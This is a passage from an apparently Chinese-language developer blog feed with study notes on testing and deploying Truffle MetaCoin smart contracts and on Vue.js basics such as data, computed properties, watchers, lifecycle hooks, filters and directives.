class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> MetaCoin = artifacts.require(<span class="string">"MetaCoin"</span>);</span><br><span class="line"></span><br><span class="line">contract(<span class="string">'2nd MetaCoin test'</span>, <span class="keyword">async</span> (accounts) =&gt; &#123;</span><br><span class="line"></span><br><span class="line">  it(<span class="string">"should put 10000 MetaCoin in the first account"</span>, <span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">     <span class="keyword">let</span> instance = <span class="keyword">await</span> MetaCoin.deployed();</span><br><span class="line">     <span class="keyword">let</span> balance = <span class="keyword">await</span> instance.getBalance.call(accounts[<span class="number">0</span>]);</span><br><span class="line">     assert.equal(balance.valueOf(), <span class="number">10000</span>);</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  it(<span class="string">"should call a function that depends on a linked library"</span>, <span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> meta = <span class="keyword">await</span> MetaCoin.deployed();</span><br><span class="line">    <span class="keyword">let</span> outCoinBalance = <span class="keyword">await</span> meta.getBalance.call(accounts[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">let</span> metaCoinBalance = outCoinBalance.toNumber();</span><br><span class="line">    <span class="keyword">let</span> outCoinBalanceEth = <span class="keyword">await</span> meta.getBalanceInEth.call(accounts[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">let</span> metaCoinEthBalance = outCoinBalanceEth.toNumber();</span><br><span class="line">    assert.equal(metaCoinEthBalance, <span class="number">2</span> * metaCoinBalance);</span><br><span class="line"></span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  it(<span class="string">"should send coin correctly"</span>, <span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get initial balances of first and second account.</span></span><br><span class="line">    <span class="keyword">let</span> account_one = accounts[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">let</span> account_two = accounts[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> amount = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> instance = <span class="keyword">await</span> MetaCoin.deployed();</span><br><span class="line">    <span class="keyword">let</span> meta = instance;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> balance = <span class="keyword">await</span> meta.getBalance.call(account_one);</span><br><span class="line">    <span class="keyword">let</span> account_one_starting_balance = balance.toNumber();</span><br><span class="line"></span><br><span class="line">    balance = <span class="keyword">await</span> meta.getBalance.call(account_two);</span><br><span class="line">    <span class="keyword">let</span> account_two_starting_balance = balance.toNumber();</span><br><span class="line">    <span class="keyword">await</span> meta.sendCoin(account_two, amount, &#123;<span class="attr">from</span>: account_one&#125;);</span><br><span class="line"></span><br><span class="line">    balance = <span class="keyword">await</span> meta.getBalance.call(account_one);</span><br><span class="line">    <span class="keyword">let</span> account_one_ending_balance = balance.toNumber();</span><br><span class="line"></span><br><span class="line">    balance = <span class="keyword">await</span> meta.getBalance.call(account_two);</span><br><span class="line">    <span class="keyword">let</span> account_two_ending_balance = balance.toNumber();</span><br><span class="line"></span><br><span class="line">    assert.equal(account_one_ending_balance, account_one_starting_balance - amount, <span class="string">"Amount wasn't correctly taken from the sender"</span>);</span><br><span class="line">    assert.equal(account_two_ending_balance, account_two_starting_balance + amount, <span class="string">"Amount wasn't correctly sent to the receiver"</span>);</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><h3 id="合约测试文件"><a href="#合约测试文件" class="headerlink" title="合约测试文件"></a>合约测试文件</h3><p>分函数测试，直接看例子：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">"truffle/Assert.sol"</span>;<span class="comment">//引入断言库</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">"truffle/DeployedAddresses.sol"</span>;<span class="comment">//引入获取合约地址的库</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">"../contracts/MetaCoin.sol"</span>;</span><br><span class="line"></span><br><span class="line">contract TestMetacoin &#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">testInitialBalanceUsingDeployedContract</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    MetaCoin meta = MetaCoin(DeployedAddresses.MetaCoin());</span><br><span class="line"></span><br><span class="line">    uint expected = <span class="number">10000</span>;</span><br><span class="line"></span><br><span class="line">    Assert.equal(meta.getBalance(tx.origin), expected, <span class="string">"Owner should have 10000 MetaCoin initially"</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">testInitialBalanceWithNewMetaCoin</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    MetaCoin meta = <span class="keyword">new</span> MetaCoin();</span><br><span class="line"></span><br><span class="line">    uint expected = <span class="number">10000</span>;</span><br><span class="line"></span><br><span class="line">    Assert.equal(meta.getBalance(tx.origin), expected, <span class="string">"Owner should have 10000 MetaCoin initially"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>测试结果：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ truffle <span class="built_in">test</span></span><br><span class="line">Compiling ConvertLib.sol...</span><br><span class="line">Compiling MetaCoin.sol...</span><br><span class="line">Compiling truffle/Assert.sol</span><br><span class="line">Compiling truffle/DeployedAddresses.sol</span><br><span class="line">Compiling ../<span class="built_in">test</span>/TestMetacoin.sol...</span><br><span class="line"></span><br><span class="line">  TestMetacoin</span><br><span class="line">    ✓ testInitialBalanceUsingDeployedContract (61ms)</span><br><span class="line">    ✓ testInitialBalanceWithNewMetaCoin (69ms)</span><br><span class="line"></span><br><span class="line">  2 passing (3s)</span><br></pre></td></tr></table></figure><h2 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h2><p>部署到Ganache 或其他链上时，配置配置文件<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  networks: &#123;</span><br><span class="line">    development: &#123;</span><br><span class="line">      host: <span class="string">"127.0.0.1"</span>,</span><br><span class="line">      port: <span class="number">7545</span>,</span><br><span class="line">      network_id: <span class="string">"*"</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><h2 id="truffle-使用实例"><a href="#truffle-使用实例" class="headerlink" title="truffle 使用实例"></a>truffle 使用实例</h2><h3 id="部署合约依赖"><a href="#部署合约依赖" class="headerlink" title="部署合约依赖"></a>部署合约依赖</h3><p>在 Contract.sol 中使用 Coin 合约<br><code>Contract.sol</code>：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.15</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">"./Coin.sol"</span>;</span><br><span class="line"></span><br><span class="line">contract Contract &#123;</span><br><span class="line">    Coin coin;</span><br><span class="line">    address owner;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">Contract</span>(<span class="params">address _address</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        coin = Coin(_address);</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p><code>2_deploy_all.js</code>部署文件：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> Coin = artifacts.require(<span class="string">"./Coin.sol"</span>);</span><br><span class="line"><span class="keyword">var</span> Contract = artifacts.require(<span class="string">"./Contract.sol"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="function"><span class="keyword">function</span>(<span class="params">deployer</span>) </span>&#123;</span><br><span class="line">  deployer.deploy(Coin).then(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> deployer.deploy(Contract,Coin.address);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;— Truffle安装&amp;amp;使用 —&lt;br&gt;
    
    </summary>
    
    
      <category term="智能合约" scheme="http://lalajun.com/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/"/>
    
  </entry>
  
  <entry>
    <title>Vue-基础</title>
    <link href="http://lalajun.com/2018/07/11/Vue/"/>
    <id>http://lalajun.com/2018/07/11/Vue/</id>
    <published>2018-07-11T06:05:28.000Z</published>
    <updated>2018-07-22T06:25:45.720Z</updated>
    
    <content type="html"><![CDATA[<p>— 点点开发技能树  —<br>— Vue环境 及 语法 —<br><a id="more"></a></p><h1 id="Vue"><a href="#Vue" class="headerlink" title="Vue"></a>Vue</h1><p>Vue是一种前端JS框架，这里根据<strong>《Vue.js实战》</strong> 以及 <a href="https://cn.vuejs.org/v2/guide/" target="_blank" rel="noopener">官网教程</a> 记录了下学习笔记，方便以后回忆。</p><h1 id="Vue开发环境"><a href="#Vue开发环境" class="headerlink" title="Vue开发环境"></a>Vue开发环境</h1><p>通常有两种方式使用Vue——作为js包进入，直接使用；当做使用npm安装框架，然后模块开发。</p><h2 id="网页快速开发"><a href="#网页快速开发" class="headerlink" title="网页快速开发"></a>网页快速开发</h2><ul><li>引入vue.js<ul><li>开发版本(有错误调试信息)<code>vue.js</code>：<code>&lt;script src=&quot;https://cdn.jsdelivr.net/npm/vue@2.5.16/dist/vue.js&quot;&gt;&lt;/script&gt;</code></li><li>生产版本<code>vue.min.js</code>：<code>&lt;script src=&quot;https://cdn.jsdelivr.net/npm/vue@2.5.16/dist/vue.min.js&quot;&gt;&lt;/script&gt;</code></li></ul></li><li>编写vue</li></ul><h2 id="框架开发-Vue-cli"><a href="#框架开发-Vue-cli" class="headerlink" title="框架开发 Vue-cli"></a>框架开发 Vue-cli</h2><p><code>npm i vue-cli -g</code>:全局安装vue-cli<br><code>vue init webpack</code>:使用webpack作为模板(simple是功能简化)</p><p><code>npm run dev</code>:开发环境下加载项目，包括以下步骤</p><ul><li><strong>加载环境变量</strong>：加载config下index.js和dev.env.js</li><li><strong>合并webpack配置</strong>：合并<code>webpack.base.conf.js</code>、<code>webpack.dev.conf.js</code>、<code>webpack.prod.con.js</code></li><li><strong>配置热加载</strong>：修改的代码可以实时应用</li><li><strong>配置代理服务器</strong>：为增加模拟服务端做准备</li><li><strong>配置静态资源</strong>：配置静态文件到static虚目录中</li><li><strong>加载开发服务器</strong>：启动一个Express的WEB服务器</li></ul><p><code>npm run build</code>:编译生产环境</p><blockquote><p>具体利用webpack作为模板，Vue框架开发，在另一篇中具体说明</p></blockquote><hr><h1 id="选项"><a href="#选项" class="headerlink" title="选项"></a>选项</h1><p><strong>选项</strong>相当于Vue的小组件，构成Vue的功能，对象，数据，生命周期，通讯，监听等等。</p><h2 id="Vue常用选项"><a href="#Vue常用选项" class="headerlink" title="Vue常用选项"></a>Vue常用选项</h2><p>Vue结构和常用选项如下。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> app = <span class="keyword">new</span> Vue(&#123;</span><br><span class="line">    el: <span class="string">''</span>,    <span class="comment">//挂载DOM对象</span></span><br><span class="line">    data: &#123;    <span class="comment">//数据</span></span><br><span class="line"></span><br><span class="line">    &#125;,</span><br><span class="line">    methods: &#123;  <span class="comment">//事件处理器</span></span><br><span class="line"></span><br><span class="line">    &#125;,</span><br><span class="line">    computed: &#123;  <span class="comment">//计算属性</span></span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    components: &#123; <span class="comment">//注册局部组件</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    filters: &#123;  <span class="comment">//过滤器</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><blockquote><p>所有的选项都不要使用<code>() =&gt;</code>的形式来定义函数，这是因为箭头函数绑定了父上下文，因此 this 与你期待的 Vue 实例不同。（不懂，但是都是用function()吧）</p></blockquote><h2 id="DOM"><a href="#DOM" class="headerlink" title="DOM"></a>DOM</h2><h3 id="el-挂载点"><a href="#el-挂载点" class="headerlink" title="el 挂载点"></a>el 挂载点</h3><p>　　提供一个在页面上已存在的 DOM 元素作为 Vue 实例的挂载目标。可以是 CSS 选择器，也可以是一个 HTMLElement 实例。</p><h3 id="template"><a href="#template" class="headerlink" title="template"></a>template</h3><p>　　通常在模块中使用。提供一个在页面上已存在的 DOM 元素作为 Vue 实例的挂载目标。可以是 CSS 选择器，也可以是一个 HTMLElement 实例。</p><p>　　在模块中说明</p><h3 id="render"><a href="#render" class="headerlink" title="render"></a>render</h3><p>　　字符串模板的代替方案，允许你发挥 JavaScript 最大的编程能力。该渲染函数接收一个 createElement 方法作为第一个参数用来创建 VNode。</p><p>　　使用方法很高端，没用过，不详细说明</p><h2 id="数据"><a href="#数据" class="headerlink" title="数据"></a>数据</h2><p>Vue中的数据形式分为：数据<code>data</code>，计算属性<code>computed</code>。另外说明数据输出到html的方式</p><h3 id="data-数据"><a href="#data-数据" class="headerlink" title="data 数据"></a>data 数据</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//new Vue 中可以返回对象</span></span><br><span class="line">data :&#123;  <span class="comment">//数据</span></span><br><span class="line">        firstName : <span class="string">'jack'</span>,</span><br><span class="line">        lastName : <span class="string">'Green'</span></span><br><span class="line">    &#125;,</span><br><span class="line"><span class="comment">//Vue组件中 只可以返回函数</span></span><br><span class="line">data :<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        firstName : <span class="string">'jack'</span>,</span><br><span class="line">        lastName : <span class="string">'Green'</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="computed-计算属性"><a href="#computed-计算属性" class="headerlink" title="computed 计算属性"></a>computed 计算属性</h3><p>　　<strong>计算属性</strong> 就是多个数据经过各种复杂的计算，最终返回一个结果<br>　　每一个计算属性都包含一个<code>getter</code>和一个<code>setter</code>,默认是只有<code>getter</code></p><ul><li>当用到的数据有一个发生变化，计算属性的<code>getter</code>就会重新执行</li><li>当计算属性的结果更新是，<code>setter</code>就会执行</li></ul><p>姓名的姓氏和名字互相组合替换功能<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">    data :&#123;</span><br><span class="line">        firstName : <span class="string">'jack'</span>,</span><br><span class="line">        lastName : <span class="string">'Green'</span></span><br><span class="line">    &#125;,</span><br><span class="line">    computed:&#123; <span class="comment">//默认就是getter的情况</span></span><br><span class="line">        fullName : <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.firstName + <span class="string">' '</span> + <span class="keyword">this</span>.lastName;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    computed:&#123; <span class="comment">//两者都有的情况</span></span><br><span class="line">        fullName : &#123;</span><br><span class="line">            get: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">this</span>.firstName + <span class="string">' '</span> + <span class="keyword">this</span>.lastName;</span><br><span class="line">            &#125;,</span><br><span class="line">            set: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="keyword">var</span> names = newValue.split(<span class="string">' '</span>);</span><br><span class="line">                <span class="keyword">this</span>.firstName = names[<span class="number">0</span>];</span><br><span class="line">                <span class="keyword">this</span>.lastName = names[names.length - <span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><h3 id="显示数据"><a href="#显示数据" class="headerlink" title="显示数据"></a>显示数据</h3><p>Vue会根据双括号来动态替换数据<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123;&#123;filename&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">javascript</span>&gt;</span></span><br><span class="line">var app = new Vue(&#123;</span><br><span class="line">    data: &#123;</span><br><span class="line">        filename: 'file'</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">javascript</span>&gt;</span></span><br></pre></td></tr></table></figure></p><h2 id="事件-监听"><a href="#事件-监听" class="headerlink" title="事件/监听"></a>事件/监听</h2><h3 id="事件-methods"><a href="#事件-methods" class="headerlink" title="事件 methods"></a>事件 methods</h3><p><code>methods</code>自定义触发函数<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> vm = <span class="keyword">new</span> Vue(&#123;</span><br><span class="line">  data: &#123; <span class="attr">a</span>: <span class="number">1</span> &#125;,</span><br><span class="line">  methods: &#123;</span><br><span class="line">    plus: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="keyword">this</span>.a++</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line">vm.plus()</span><br><span class="line">vm.a <span class="comment">// 2</span></span><br></pre></td></tr></table></figure></p><p>结合<code>v-on</code>指令可以构成事件。</p><h3 id="监听-watch"><a href="#监听-watch" class="headerlink" title="监听 watch"></a>监听 watch</h3><p>　　watch选项用来监听某个prop或data的改变，当他们发生变化时，就会触发watch配置的函数。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">watch:&#123;</span><br><span class="line">    <span class="comment">//监听Value变量</span></span><br><span class="line">    Value: <span class="function"><span class="keyword">function</span> (<span class="params">val</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.currentValue = val; <span class="comment">//使用父组件的v-model改变值</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="生命周期钩子"><a href="#生命周期钩子" class="headerlink" title="生命周期钩子"></a>生命周期钩子</h2><p>生命周期钩子，就是在页面渲染到不同的阶段，执行自定义的操作。列出所有，选一个常用的mounted说明：</p><ul><li>beforeCreate</li><li>created</li><li>beforeMount</li><li>mounted</li><li>beforeUpdate</li><li>updated</li><li>activated</li><li>deactivated</li><li>beforeDestroy</li><li>destroyed</li><li>errorCaptured</li></ul><h3 id="生命周期图例"><a href="#生命周期图例" class="headerlink" title="生命周期图例"></a>生命周期图例</h3><p>以下说明各个生命周期钩子的位置，以及已经执行了什么。<br><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fthm8iszxuj30xc2cft9s.jpg" alt="生命周期图例"></p><h3 id="mounted"><a href="#mounted" class="headerlink" title="mounted"></a>mounted</h3><p>　　当挂载完成后，调用该钩子.注意 <code>mounted</code> 不会承诺所有的子组件也都一起被挂载。如果你希望等到整个视图都渲染完毕，可以用 <code>vm.$nextTick</code> 替换掉 <code>mounted</code><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mounted: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.$nextTick(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// Code that will run only after the</span></span><br><span class="line">    <span class="comment">// entire view has been rendered</span></span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="过滤器-filters"><a href="#过滤器-filters" class="headerlink" title="过滤器 filters"></a>过滤器 filters</h2><p>　　过滤器可以用在两个地方：<strong>双花括号插值</strong> 和 <strong>v-bind 表达式</strong><br>　　过滤器应该被添加在 JavaScript 表达式的尾部，由“管道”符号指示：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 在双花括号中 --&gt;</span></span><br><span class="line">&#123;&#123; message | capitalize &#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 在 `v-bind` 中 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">v-bind:id</span>=<span class="string">"rawId | formatId"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 过滤器可以串联 --&gt;</span></span><br><span class="line">&#123;&#123; message | filterA | filterB &#125;&#125;</span><br><span class="line"><span class="comment">&lt;!-- 过滤器可以接受参数 参数1：message 参数二：arg1 参数三：arg2 --&gt;</span></span><br><span class="line">&#123;&#123; message | filterA('arg1', arg2) &#125;&#125;</span><br></pre></td></tr></table></figure></p><h3 id="自定义过滤器"><a href="#自定义过滤器" class="headerlink" title="自定义过滤器"></a>自定义过滤器</h3><p>　　在一个组件的选项中定义本地的过滤器：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">filters: &#123;</span><br><span class="line">  capitalize: <span class="function"><span class="keyword">function</span> (<span class="params">value</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!value) <span class="keyword">return</span> <span class="string">''</span></span><br><span class="line">    value = value.toString()</span><br><span class="line">    <span class="keyword">return</span> value.charAt(<span class="number">0</span>).toUpperCase() + value.slice(<span class="number">1</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>　　或全局定义过滤器<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Vue.filter(<span class="string">'capitalize'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">value</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!value) <span class="keyword">return</span> <span class="string">''</span></span><br><span class="line">  value = value.toString()</span><br><span class="line">  <span class="keyword">return</span> value.charAt(<span class="number">0</span>).toUpperCase() + value.slice(<span class="number">1</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><h2 id="组件-components"><a href="#组件-components" class="headerlink" title="组件 components"></a>组件 components</h2><p>　　使用<code>components</code>可以用<code>Vue.component</code>定义一个新的组件，也可以在父组件内定义（如同其他选项一样）。<br>　　具体在组件篇中说明</p><hr><h1 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h1><p><a href="https://cn.vuejs.org/v2/api/#%E6%8C%87%E4%BB%A4" target="_blank" rel="noopener">Vue指令</a>有很多,说明常用指令</p><h2 id="v-cloak"><a href="#v-cloak" class="headerlink" title="v-cloak"></a>v-cloak</h2><p>　　当在简单的项目中，js还没有加载完时，页面会显示一些未渲染完的东西比如<code>｛｛name｝｝</code>，在加载完后会闪动页面刷新显示。而在工程化项目里，因为HTML结构只有一个空的div元素，所以不会有闪动情况。<br>　　<strong>v-cloak</strong>就是用于vue.js还未加载完时，隐藏vue的html部分。</p><ul><li>不需要表达式</li><li>通常与css一起使用。</li></ul><p>html页面<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=<span class="string">'app'</span> v-cloak&gt;</span><br><span class="line">&lt;<span class="regexp">/div&gt;</span></span><br></pre></td></tr></table></figure></p><p>css页面<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-attr">[v-cloak]</span> &#123;</span><br><span class="line">    <span class="attribute">diaplay</span>: none</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="v-once"><a href="#v-once" class="headerlink" title="v-once"></a>v-once</h2><p>　　<strong>v-once</strong>：定义他的元素或组件只渲染一次，包括元素或者组件的所有子节点。首次渲染后，不再跟随数据的变化重新渲染，将被视为静态内容。</p><h2 id="v-bind-修改属性"><a href="#v-bind-修改属性" class="headerlink" title="v-bind 修改属性"></a>v-bind 修改属性</h2><p><code>v-bind</code>:可以动态修改标签的属性<br>下面说细节的使用方式</p><h3 id="字符串语法"><a href="#字符串语法" class="headerlink" title="字符串语法"></a>字符串语法</h3><p>字符串语法可以动态调用变量<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//直接使用，用data中的url动态更新href属性</span></span><br><span class="line">&lt;a v-bind:href=<span 